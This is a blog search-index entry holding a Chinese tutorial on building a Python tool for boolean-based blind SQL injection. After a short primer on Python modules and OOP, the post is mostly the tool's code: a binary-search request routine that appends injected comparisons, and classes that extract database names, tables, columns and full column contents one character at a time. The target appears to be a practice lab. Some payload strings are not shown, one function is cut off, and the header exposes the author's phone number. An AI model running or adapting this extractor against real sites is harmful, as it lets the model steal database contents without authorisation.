<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[基于sql布尔盲注的python脚本开发]]></title>
    <url>%2F2020%2F03%2F07%2F%E5%9F%BA%E4%BA%8Esql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%9A%84python%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91.html</url>
    <content type="text"><![CDATA[4.1 python概述4.1.1 模块详解optparse 作用:定制脚本的参数化命令。 用法： import optparse #导入optparse模块 parser = optparse.OptionParser() #实例化一个 OptionParser 对象(可以带参，也可以不带参数)，带参的话会把参数变量的内容作为帮助信息输出。 parser.add_option(&quot;-D&quot;, &quot;--database&quot;, action=&quot;store&quot;,type=&quot;string&quot;,dest=&quot;database&quot;,help=&quot;Please input test databases&quot;) #需要的命令行参数 (options,args)=parser.parse_args() #解析脚本输入的参数值，options是一个包含了option值的对象;args是一个位置参数的列表 add_option()方法中的参数说明 action: 用于控制对选项和参数的处理,像无参数选项处理。（缺省为stroe。 stroe_true, stroe_false） type: 选项的值类型,值的默认类型是字符串, 这里将值指定为其他类型. help:选项中有 -h 时打印的 help 信息. dest:可以决定解析后,取值时的属性名, 尤其适于有多个等价参数. 不指定时就是选项不加-的字符串. requests 作用：模拟人操作浏览器对网页的请求操作。 用法： import requests #导入requests模块 requests.get(‘https://github.com/timeline.json’) # GET请求 requests.post(“http://httpbin.org/post”) # POST请求 requests.put(“http://httpbin.org/put”) # PUT请求 requests.delete(“http://httpbin.org/delete”) # DELETE请求 requests.head(“http://httpbin.org/get”) # HEAD请求 requests.options(“http://httpbin.org/get” ) # OPTIONS请求 响应的内容 r.encoding #获取当前的编码 r.encoding = &#39;utf-8&#39; #设置编码 r.text #以encoding解析返回内容。字符串方式的响应体，会自动根据响应头部的字符编码进行解码。 r.content #以字节形式（二进制）返回。字节方式的响应体，会自动为你解码 gzip 和 deflate 压缩。 r.headers #以字典对象存储服务器响应头，字典键不区分大小写，若键不存在则返回None r.status_code #响应状态码 r.raw #返回原始响应体，也就是 urllib 的 response 对象，使用 r.raw.read() r.ok # 查看r.ok的布尔值便可以知道是否登陆成功 r.json() #Requests中内置的JSON解码器，以json形式返回 r.raise_for_status() #失败请求(非200响应)抛出异常 time 作用：可以用于格式化日期和时间，时间间隔是以秒为单位的浮点小数。 用法： import time #导入time模块 time.sleep(secs) #推迟调用线程的运行，secs指秒数。 time.time() #获取当前的系统的时间戳 sys 作用：sys模块提供对由解释器使用或维护的某些变量、与解释器交互的函数的访问接口。 用法： sys.argv #传递给python脚本的命令行参数列表。argv[0]表示脚本名称(是不是完成路径名取决于操作系统)。如果命令使用-c选项执行，argv[0]表示字符串-c。如果命令行没有指定脚本名称，argv[0]为空字符串。 sys.exit(n) #程序退出，如果是正常退出是sys.exit(0) sys.path #返回模块的搜索路径，初始化时使用PYTHONPATH环境变量的值 sys.stdout.write sys.stdout.flush #刷新缓冲区 4.1.2 面向对象面向对象编程——Object Oriented Programming，简称 OOP，是一种程序设计思想。OOP 把对象作为程序的基本单元，一个对象包含了数据和操作数据的函数。面向对象的程序设计把计算机程序视为一组对象的集合，而每个对象都可以接收其他对象发过来的消息，并处理这些消息，计算机程序的执行就是一系列消息在各个对象之间传递。在 Python 中，所有数据类型都可以视为对象，当然也可以自定义对象。自定义的对象数据类型就是面向对象中的类（Class）的概念。 类(Class): 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。 方法：类中定义的函数。 类变量：类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。 数据成员：类变量或者实例变量用于处理类及其实例对象的相关的数据。 方法重写：如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。 局部变量：定义在方法中的变量，只作用于当前实例的类。 实例变量：在类的声明中，属性是用变量来表示的，这种变量就称为实例变量，实例变量就是一个用 self 修饰的变量。 继承：即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟”是一个（is-a）”关系（例图，Dog是一个Animal）。 实例化：创建一个类的实例，类的具体对象。 对象：通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。 三大特点：数据封装、继承、多态。 4.2 脚本开发4.2.1 功能逻辑设计思路 基于布尔型盲注脚本开发 主程序入口(boolbaseblind.py) optparse模块实现脚本参数化输入 对功能模块的调用 二分查找与网页请求(class Merge_serach) get_url_request 实现网页请求功能 merge_serach 实现二分查找遍历数值 猜解数据库库名(class GuessDatabase) get_all_db_Count 实现获取数据库库名数量 get_all_db_Length 实现获取所有库名的长度功能 def get_all_db_Name 实现获取所库名称功能 猜解数据库表名(class GuessTables) get_all_table_Count 实现获取指定库所有表名数量 get_all_table_Length 实现获取指定库所有表名的长度功能 get_all_table_Name 实现获取指定库所有表名称功能 猜解数据库字段名(class GuessColumns) get_all_column_Count 实现获取指定表中所有字段数量 get_all_column_Length 实现获取指定表中所有字段长度 get_all_column_Name 实现获取指定表中所有字段名 猜解数据库字段内容(class GuessClContent) get_all_cl_content_Count 实现获取指定字段中所有字段内容的数量 get_all_cl_content_Length 实现获取指定字段中所有字段内容的长度 get_all_cl_content_details 实现获取指定字段中所有字段内容 4.2.2 编码实现 主程序入口(boolbaseblind.py) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/usr/local/env python3# -*- coding: UTF-8 -*-# Author: Mr.zhang# Tel:15888371774# Date:2020-2-28from guessdatabase import GuessDatabasefrom guesstables import GuessTablesfrom guesscolumns import GuessColumnsfrom guessclcontent import GuessClContentimport optparseimport timeimport sysparser=optparse.OptionParser()parser.add_option("-D", "--database", action="store",type="string",dest="database",help="Please input test databases")parser.add_option("-T", "--table",action="store",type="string",dest="table",help="Please input test table")parser.add_option("-C", "--column",action="store",type="string",dest="column",help="Please input test column")parser.add_option("-U","--url", action="store",type="string",dest="url",help="Please input test url")(options,args) = parser.parse_args()def main(): if options.url == None and options.database == None and options.table == None and options.column == None: print("Please read the help") parser.print_help() sys.exit() elif options.url != None and options.database ==None and options.table == None and options.column == None: start_time = time.time() guessdb = GuessDatabase(options.url) #创建获取guessdb对象 db_count = guessdb.get_all_db_Count() db_length_list = guessdb.get_all_db_Length(db_count) guessdb.get_all_db_Name(db_count, db_length_list) end_time = time.time() print('[+] INFO : \033[1;35;0m猜解所有库名所用时间为 %d 秒 \033[0m' %int(end_time-start_time)) elif options.url != None and options.database !=None and options.table == None and options.column == None: start_time = time.time() guesstb = GuessTables(options.url,options.database) #创建获取guesstb对象 tb_count = guesstb.get_all_table_Count() tb_length_list = guesstb.get_all_table_Length(tb_count) guesstb.get_all_table_Name(tb_count, tb_length_list) end_time = time.time() print('[+] INFO : \033[1;35;0m猜解所有表名所用时间为 %d 秒 \033[0m' %int(end_time-start_time)) elif options.url != None and options.database !=None and options.table != None and options.column == None: start_time = time.time() guesscl = GuessColumns(options.url,options.database,options.table) cl_count = guesscl.get_all_column_Count() cl_length_list = guesscl.get_all_column_Length(cl_count) guesscl.get_all_column_Name(cl_count, cl_length_list) end_time = time.time() print('[+] INFO : \033[1;35;0m猜解所有字段名所用时间为 %d 秒 \033[0m' %int(end_time-start_time)) elif options.url != None and options.database !=None and options.table != None and options.column != None: start_time = time.time() guessclcontent = GuessClContent(options.url,options.database,options.table,options.column) cl_content_count = guessclcontent.get_all_cl_content_Count() cl_content_length_list = guessclcontent.get_all_cl_content_Length(cl_content_count) guessclcontent.get_all_cl_content_details(cl_content_count, cl_content_length_list) end_time = time.time() print('[+] INFO : \033[1;35;0m猜解所有字段内容所用时间为 %d 秒 \033[0m' %int(end_time-start_time)) if __name__ == "__main__": main() 二分查找与网页请求(class Merge_serach) get_url_requests 实现网页请求功能 123456def get_url_request(self, final_payload): try: result = requests.get(url = final_payload, headers = self.headers, timeout = 3).text except TimeoutError as e: print("请求超时。。。") return result merge_serach 实现二分查找遍历数值 123456789101112131415161718def merge_serach(self, url, payload): # 定义循环数据列表 range_list = [x for x in range(0,127)] min = 0 #代表列表下标的起始值 max = len(range_list) - 1 #代表列表下标的结束值 while True: mid = (max + min) // 2 #获取列表下标的中间值 #定义最终payload格式 final_payload = url + payload + ' &gt; &#123;&#125;--+'.format(mid) result = self.get_url_request(final_payload) if "You are in" in result: min = mid else: max = mid if min == max - 1: if "You are in" in result: return max return min+1 猜解数据库库名(class GuessDatabase) get_all_db_Count 实现获取数据库库名数量 1234def get_all_db_Count(self): db_count = self.merge_serach.merge_serach(self.url, self.db_count_payload) print('[+] INFO : 当前 mysql 中库的数量为: %d' %(db_count)) return db_count get_all_db_Length 实现获取所有库名的长度功能 12345678def get_all_db_Length(self, db_count): db_length_list = [] #循环获取所有表名的长度 for i in range(0,db_count): db_length = self.merge_serach.merge_serach(self.url, self.db_length_payload.format(i)) db_length_list.append(db_length) # print("[+] INFO : 库 %d 的长度是: %d" % (i+1, db_length)) return db_length_list def get_all_db_Name 实现获取所库名称功能 12345678910def get_all_db_Name(self, db_count, db_length_list): for i in range(0, db_count): print('[+] INFO : 库 %d 的名称为: ' %(i+1), end = '') db_name = "" for j in range(1, db_length_list[i] + 1): curr_str = chr(self.merge_serach.merge_serach(self.url, self.db_name_payload.format(i, j))) db_name += curr_str sys.stdout.write(curr_str) sys.stdout.flush() print('') 猜解数据库表名(class GuessTables) get_all_table_Count 实现获取指定库所有表名数量 1234def get_all_table_Count(self): tb_count = self.merge_serach.merge_serach(self.url, self.tb_count_payload.format(self.db_name)) print('[+] INFO : 当前 %s 库中表的数量为: %d' %(self.db_name, tb_count)) return tb_count get_all_table_Length 实现获取指定库所有表名的长度功能 1234567def get_all_table_Length(self, tb_count): tb_length_list = [] for i in range(0, tb_count): tb_length = self.merge_serach.merge_serach(self.url, self.tb_length_payload.format(self.db_name, i)) tb_length_list.append(tb_length) # print(tb_length_list) return tb_length_list get_all_table_Name 实现获取指定库所有表名称功能 12345678910def get_all_table_Name(self, tb_count, tb_length_list): for i in range(0, tb_count): print('[+] INFO : 当前 %s 库中第 %d 个表的名称为:' %(self.db_name, i + 1), end = '') tb_name = "" for j in range(1, tb_length_list[i] + 1): curr_str = chr(self.merge_serach.merge_serach(self.url, self.tb_name_payload.format(self.db_name, i, j))) tb_name += curr_str sys.stdout.write(curr_str) sys.stdout.flush() print('') 猜解数据库字段名(class GuessColumns) get_all_column_Count 实现获取指定表中所有字段数量 1234def get_all_column_Count(self): cl_count = self.merge_serach.merge_serach(self.url, self.cl_count_payload.format(self.db_name, self.tb_name)) print('[+] INFO : 当前 %s 表中字段的数量为: %d' %(self.tb_name, cl_count)) return cl_count get_all_column_Length 实现获取指定表中所有字段长度 1234567def get_all_column_Length(self, cl_count): cl_length_list = [] for i in range(0, cl_count): cl_length = self.merge_serach.merge_serach(self.url, self.cl_length_payload.format(self.db_name, self.tb_name, i)) cl_length_list.append(cl_length) # print(cl_length_list) return cl_length_list get_all_column_Name 实现获取指定表中所有字段名 12345678910def get_all_column_Name(self, cl_count, cl_length_list): for i in range(0, cl_count): print('[+] INFO : 当前 %s 表中第 %d 个字段的名称为:' %(self.db_name, i + 1), end = '') cl_name = "" for j in range(1, cl_length_list[i] + 1): curr_str = chr(self.merge_serach.merge_serach(self.url, self.cl_name_payload.format(self.db_name, self.tb_name, i, j))) cl_name += curr_str sys.stdout.write(curr_str) sys.stdout.flush() print('') 猜解数据库字段内容(class GuessClContent) get_all_cl_content_Count 实现获取指定字段中所有字段内容的数 12345def get_all_cl_content_Count(self): for i in range(0, len(self.cl_name_list)): cl_content_count = self.merge_serach.merge_serach(self.url, self.cl_content_count_payload.format(self.cl_name_list[i], self.db_tb_name)) print('[+] INFO : 当前 %s 字段中内容的数量为: %d' %(self.cl_name, cl_content_count)) return cl_content_count get_all_cl_content_Length 实现获取指定字段中所有字段内容的长度 1234567891011def get_all_cl_content_Length(self, cl_content_count): all_list = [] for j in range(0, len(self.cl_name_list)): cl_content_length_list = [] for i in range(0, cl_content_count): cl_content_length = self.merge_serach.merge_serach(self.url, self.cl_content_length_payload.format(self.cl_name_list[j], self.db_tb_name, i)) cl_content_length_list.append(cl_content_length) # print(cl_content_length_list) all_list.append(cl_content_length_list) # print(all_list) # print(self.db_tb get_all_cl_content_details 实现获取指定字段中所有字段内容 12345678910def get_all_cl_content_details(self, cl_content_count, all_list): for i in range(0, len(all_list)): print('[+] INFO : 字段 %s 的内容为: ' % self.cl_name_list[i],end = '') for j in range(0, len(all_list[i])): cl_content_details = "" for z in range(1, all_list[i][j] + 1): curr_str = chr(self.merge_serach.merge_serach(self.url, self.cl_content_details_payload.format(self.cl_name_list[i], self.db_tb_name, j, z))) cl_content_details += curr_str print(' | %s | ' %cl_content_details, end = '') print('')]]></content>
      <tags>
        <tag>web安全、python</tag>
      </tags>
  </entry>
</search>
